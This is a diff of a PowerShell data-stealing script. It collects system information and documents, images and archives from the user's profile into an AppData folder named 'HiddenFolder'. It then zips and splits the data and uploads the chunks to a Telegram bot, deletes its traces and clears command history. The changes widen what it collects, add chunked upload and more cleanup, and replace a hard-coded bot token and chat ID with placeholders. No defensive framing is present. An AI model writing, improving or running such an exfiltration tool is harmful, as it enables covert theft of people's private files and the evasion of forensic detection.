@@ -1,9 +1,12 @@
-
 # Customizable Parameters
-$TELEGRAM_BOT_TOKEN = "7773792784:AAFfeZfSjo3yVYIbUPA1xwlMK17l-Fak2sg"  # Replace with your bot token
-$TELEGRAM_CHAT_ID = "1318817377"               # Replace with your chat ID
-$TARGET_DIRECTORY = "$env:USERPROFILE\Desktop"   # Replace with the directory to collect files from
+$TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Replace with your bot token
+$TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"               # Replace with your chat ID
+$ROOT_DIRECTORY = "$env:USERPROFILE"             # Root directory to start searching from
 $HIDDEN_DIRECTORY = "$env:APPDATA\Microsoft\Windows\HiddenFolder"  # Hidden directory path
+$MAX_FILE_SIZE = 45MB                            # 45 MB (to stay under Telegram's 50 MB limit)
+
+# File types to collect (e.g., documents, images, etc.)
+$FILE_TYPES = @("*.txt", "*.doc", "*.docx", "*.pdf", "*.xls", "*.xlsx", "*.jpg", "*.png", "*.zip", "*.rar")
 
 # Function to send a message to Telegram
 function Send-ToTelegram {
@@ -58,12 +61,16 @@ function Get-SystemInfo {
     return ($info -join "`n")
 }
 
-# Function to collect files from a directory
+# Function to collect files of specific types
 function Get-FilesFromDirectory {
     param (
         [string]$Directory
     )
-    return Get-ChildItem -Path $Directory -Recurse -File | Select-Object -ExpandProperty FullName
+    $files = @()
+    foreach ($fileType in $FILE_TYPES) {
+        $files += Get-ChildItem -Path $Directory -Recurse -Include $fileType -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
+    }
+    return $files
 }
 
 # Function to create a ZIP file
@@ -76,10 +83,33 @@ function Create-ZipFile {
     [System.IO.Compression.ZipFile]::CreateFromDirectory($SourceFolder, $ZipFilePath)
 }
 
+# Function to split a file into smaller chunks
+function Split-File {
+    param (
+        [string]$FilePath,
+        [string]$OutputPrefix
+    )
+    $fileStream = [System.IO.File]::OpenRead($FilePath)
+    $bufferSize = $MAX_FILE_SIZE
+    $buffer = New-Object byte[] $bufferSize
+    $partNumber = 1
+
+    while ($fileStream.Position -lt $fileStream.Length) {
+        $bytesRead = $fileStream.Read($buffer, 0, $bufferSize)
+        $partFilePath = "$OutputPrefix.part_$partNumber"
+        [System.IO.File]::WriteAllBytes($partFilePath, $buffer[0..($bytesRead - 1)])
+        $partNumber++
+    }
+
+    $fileStream.Close()
+}
+
 # Function to delete footprints
 function Remove-Footprints {
     # Delete the hidden directory and its contents
-    Remove-Item -Path $HIDDEN_DIRECTORY -Recurse -Force
+    Remove-Item -Path $HIDDEN_DIRECTORY -Recurse -Force -ErrorAction SilentlyContinue
+    # Delete the temporary ZIP file and its parts
+    Remove-Item -Path "$HIDDEN_DIRECTORY.zip", "$HIDDEN_DIRECTORY.part_*" -Force -ErrorAction SilentlyContinue
     # Clear PowerShell command history
     Clear-History
 }
@@ -88,28 +118,40 @@ function Remove-Footprints {
 function Main {
     # Create a hidden directory
     New-Item -Path $HIDDEN_DIRECTORY -ItemType Directory -Force | Out-Null
-    Set-ItemProperty -Path $HIDDEN_DIRECTORY -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
     # Collect system information
     $systemInfo = Get-SystemInfo
     $systemInfoFilePath = "$HIDDEN_DIRECTORY\system_info.txt"
     $systemInfo | Out-File -FilePath $systemInfoFilePath
 
-    # Collect files from the target directory
-    $files = Get-FilesFromDirectory -Directory $TARGET_DIRECTORY
+    # Collect files of specific types
+    Write-Host "Collecting files from $ROOT_DIRECTORY..."
+    $files = Get-FilesFromDirectory -Directory $ROOT_DIRECTORY
     foreach ($file in $files) {
-        Copy-Item -Path $file -Destination $HIDDEN_DIRECTORY
+        Write-Host "Copying $file to $HIDDEN_DIRECTORY"
+        Copy-Item -Path $file -Destination $HIDDEN_DIRECTORY -Force
     }
 
-    # Create a ZIP file
-    $zipFilePath = "$env:TEMP\collected_data.zip"
+    # Compress the hidden directory into a ZIP file
+    Write-Host "Creating ZIP file..."
+    $zipFilePath = "$HIDDEN_DIRECTORY.zip"
     Create-ZipFile -SourceFolder $HIDDEN_DIRECTORY -ZipFilePath $zipFilePath
 
-    # Send the ZIP file to Telegram
-    Send-FileToTelegram -FilePath $zipFilePath
+    # Split the ZIP file into smaller chunks
+    Write-Host "Splitting ZIP file..."
+    Split-File -FilePath $zipFilePath -OutputPrefix $HIDDEN_DIRECTORY
+
+    # Send each chunk to Telegram
+    Write-Host "Sending ZIP file parts to Telegram..."
+    foreach ($part in (Get-ChildItem -Path "$HIDDEN_DIRECTORY.part_*")) {
+        Send-FileToTelegram -FilePath $part.FullName
+    }
 
     # Delete footprints
+    Write-Host "Cleaning up..."
     Remove-Footprints
+
+    Write-Host "Done!"
 }
 
 # Run the main function
